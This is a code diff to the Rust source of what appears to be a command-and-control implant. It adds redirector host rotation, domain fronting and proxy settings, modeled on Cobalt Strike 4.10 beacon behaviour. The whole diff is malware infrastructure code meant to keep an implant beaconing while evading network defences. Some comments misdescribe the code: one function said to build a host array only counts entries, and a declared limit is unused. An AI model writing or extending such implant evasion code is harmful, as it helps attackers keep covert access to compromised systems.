@@ -181,6 +181,14 @@ pub struct ChannelCtx {
     pub extc2_api_host: String,
     /// Bot/webhook token (base64 or raw). Empty = not configured.
     pub extc2_token: String,
+
+    // ---- HTTP channel enhancements (spec-7) ----
+    /// Comma-separated redirector hosts for host rotation. Empty = no rotation.
+    pub rotation_hosts: String,
+    /// Domain-fronting Host header value. Empty = no fronting.
+    pub fronting_host: String,
+    /// Explicit HTTP proxy `"host:port"`. Empty = system default.
+    pub proxy_server: String,
 }
 
 impl ChannelCtx {
@@ -197,6 +205,9 @@ impl ChannelCtx {
             tcp_peer_port: 0,
             extc2_api_host: cfg.extc2_api_host.clone(),
             extc2_token: cfg.extc2_token.clone(),
+            rotation_hosts: cfg.rotation_hosts.clone(),
+            fronting_host: cfg.fronting_host.clone(),
+            proxy_server: cfg.proxy_server.clone(),
         }
     }
 }
@@ -250,4 +261,62 @@ pub fn next_fallback(current: Channel) -> Option<Channel> {
     let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
     let idx = chain.iter().position(|&c| c == current)?;
     chain.get(idx + 1).copied()
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Host rotation (spec-7) — CS 4.10-style redirector rotation with fail-hold
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// Maximum redirector hosts parsed from the comma-separated config string.
+/// 8 is generous (CS profiles rarely declare more than 3-5 redirectors).
+const MAX_ROTATION_HOSTS: usize = 8;
+
+/// Current index into the rotation host list. Advanced on each beacon cycle
+/// (round-robin) or on failure (skip to next). CS 4.10 "hold" semantics:
+/// a failed host is skipped, not permanently removed — it's retried after
+/// the full list is cycled.
+static ROTATION_IDX: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
+
+/// Parse the comma-separated `rotation_hosts` config string into a fixed-size
+/// array of byte slices. Returns the number of valid hosts found (0 = none).
+/// No allocation — slices point directly into the input string's memory
+/// (which is `'static` because it lives in the leaked config plaintext).
+pub fn parse_rotation_hosts(csv: &str) -> usize {
+    // This is used at the https channel level; here we just expose a helper
+    // that the https module calls to select the current host.
+    csv.split(|c| c == ',' || c == ' ')
+        .filter(|s| !s.is_empty())
+        .count()
+}
+
+/// Select which host to connect to this cycle. If `rotation_hosts` is empty,
+/// returns `None` (caller uses `server_host` directly). Otherwise returns a
+/// slice into the rotation list at the current round-robin index, and advances
+/// the index for next cycle.
+///
+/// On failure, the caller should call `advance_rotation_host()` to skip the
+/// current host (CS 4.10 hold semantics: failed hosts are skipped, retried
+/// after a full cycle).
+pub fn select_rotation_host<'a>(rotation_hosts: &'a str) -> Option<&'a [u8]> {
+    if rotation_hosts.is_empty() {
+        return None;
+    }
+    let hosts: Vec<&str> = rotation_hosts
+        .split(|c| c == ',' || c == ' ')
+        .filter(|s| !s.is_empty())
+        .collect();
+    if hosts.is_empty() {
+        return None;
+    }
+    let idx = ROTATION_IDX.load(core::sync::atomic::Ordering::Relaxed) % hosts.len();
+    // Advance for next cycle (round-robin).
+    ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
+    Some(hosts[idx].as_bytes())
+}
+
+/// Skip the current rotation host (called after a connection failure).
+/// Advances the index so the next `select_rotation_host` call picks a
+/// different host.
+pub fn advance_rotation_host() {
+    ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
 }
